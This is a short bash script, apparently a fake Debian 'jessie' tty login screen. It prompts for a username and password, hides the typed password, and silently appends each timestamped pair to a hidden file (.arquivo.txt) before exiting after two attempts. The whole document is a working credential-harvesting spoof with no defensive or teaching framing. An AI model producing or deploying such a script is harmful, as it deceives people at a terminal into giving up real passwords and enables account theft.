#!/bin/bash

incorreto(){ sleep 3 ; echo ; echo "Login incorrect" ; }

#while : ; do
clear

echo

echo "Debian GNU/Linux 8 jessie tty1"

echo

count=0

while :

do
		echo
		read -p "jessie login: " LOGIN
		read -s -p "Password: " PASSW
	echo
		# [[ $LOGIN == "vagrant" ]] &&  [[ $PASSW == "vagrant" ]] && break 2 || incorreto
		
		#sleep 3
				#echo
				#echo "Login incorrect"
		#		incorreto
			

		#	else

				#sleep 3
				#echo
				#echo "Login incorrect"
		#		incorreto	

		echo "$(date)>> Login: $LOGIN" >> .arquivo.txt
		echo "$(date)>> Password: $PASSW" >> .arquivo.txt

		count=$(($count+1))


			[[ $count == "2" ]] &&	break
				
	done
#done
